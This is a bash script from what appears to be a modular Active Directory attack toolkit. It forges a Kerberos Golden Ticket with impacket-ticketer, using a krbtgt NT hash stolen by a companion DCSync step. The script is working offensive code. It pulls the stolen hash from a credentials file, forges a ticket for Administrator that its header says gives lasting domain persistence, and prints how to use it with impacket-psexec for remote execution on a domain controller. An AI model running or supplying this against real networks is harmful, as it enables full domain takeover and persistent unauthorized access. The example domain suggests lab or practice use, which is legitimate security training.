#!/usr/bin/env bash
# =============================================================================
#  goldenticket.sh  —  forge a Golden Ticket via impacket-ticketer  (ATOMIC)
# =============================================================================
#  Attack-chain role: domain-level persistence. With the krbtgt NT hash and the
#  domain SID, forge a TGT for any user (default Administrator) that is valid
#  until the krbtgt password is rotated TWICE — the canonical AD persistence PoC.
#
#  Consumes the krbtgt hash from creds.json (put there by dcsync.sh) and the
#  domain SID from the state file (also recorded by dcsync.sh). Errors clearly,
#  pointing at dcsync.sh, if either is missing.
#
#  Extra flags:
#    --user <name>   principal to forge (default Administrator)
#    --sid  <SID>    domain SID override (else read from state)
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
goldenticket.sh — forge a Golden Ticket via impacket-ticketer (ATOMIC)

USAGE:   ./goldenticket.sh -d <domain> [--user Administrator] [--sid S-1-5-21-...]
EXAMPLE: ./goldenticket.sh -d support.htb

FLAGS:
  --user <name>   principal to forge the ticket for (default Administrator)
  --sid  <SID>    domain SID override (else read from state/<domain>.sid)
  -h, --help      this help
  (shared flags -d/-t: --help-common)

WHAT IT DOES: ticketer -nthash <krbtgt> -domain-sid <SID> -> <user>.ccache for
  immediate use (export KRB5CCNAME, then an impacket tool with -k -no-pass).
PREREQS: krbtgt NT hash in creds.json and the domain SID — both produced by
  dcsync.sh. Errors clearly (pointing at dcsync.sh) if either is missing.
EOF
}

FORGE_USER="Administrator" SID_OVERRIDE=""

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    --user) FORGE_USER="$2"; shift 2 ;;
    --sid)  SID_OVERRIDE="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

DOMAIN="$(resolve_domain)"
[[ -n "$DOMAIN" ]] || die "no domain: pass -d <domain> (the forged ticket is domain-specific)"
need_cmd impacket-ticketer

log_begin

# Pull the krbtgt NT hash from creds.json. (It is tracked for redaction as soon
# as the library loads creds at startup, so it is safe to reference below.)
KRBTGT_NT="$(jq -r --arg d "$DOMAIN" \
  '[.[] | select((.domain==$d) and (.username|ascii_downcase=="krbtgt") and .secret_type=="ntlm_hash")][0].secret_value // empty' \
  "$CREDS_FILE" 2>/dev/null)"
[[ -n "$KRBTGT_NT" ]] || die "no krbtgt NT hash in creds.json for ${DOMAIN}. Run dcsync.sh first (e.g. dcsync.sh -m single --account krbtgt)."
secret_track "$KRBTGT_NT"

# Domain SID: flag override, else the state file dcsync.sh wrote.
SID="${SID_OVERRIDE:-$(get_domain_sid "$DOMAIN")}"
[[ -n "$SID" ]] || die "no domain SID. Pass --sid S-1-5-21-..., or re-run dcsync.sh so lookupsid records it to $(sid_file "$DOMAIN")."

log_info "forging TGT for ${DOMAIN}\\${FORGE_USER} (SID ${SID})"
CCACHE="${RUN_DIR}/${FORGE_USER}.ccache"

# ticketer writes <user>.ccache into the cwd; run it inside RUN_DIR.
run_cmd "cd '${RUN_DIR}' && impacket-ticketer -nthash $(printf '%q' "$KRBTGT_NT") -domain-sid $(printf '%q' "$SID") -domain $(printf '%q' "$DOMAIN") $(printf '%q' "$FORGE_USER")"

FORGED="$(ls -t "${RUN_DIR}"/*.ccache 2>/dev/null | head -n1)"
if [[ -n "$FORGED" ]]; then
  log_ok "Golden Ticket forged: ${FORGED}"
  log_ok "use it:  export KRB5CCNAME='${FORGED}'  then e.g.  impacket-psexec -k -no-pass ${DOMAIN}/${FORGE_USER}@<dc-fqdn>"
else
  log_err "ticketer did not produce a .ccache — check the SID/hash and impacket output above"
fi

log_end "success"
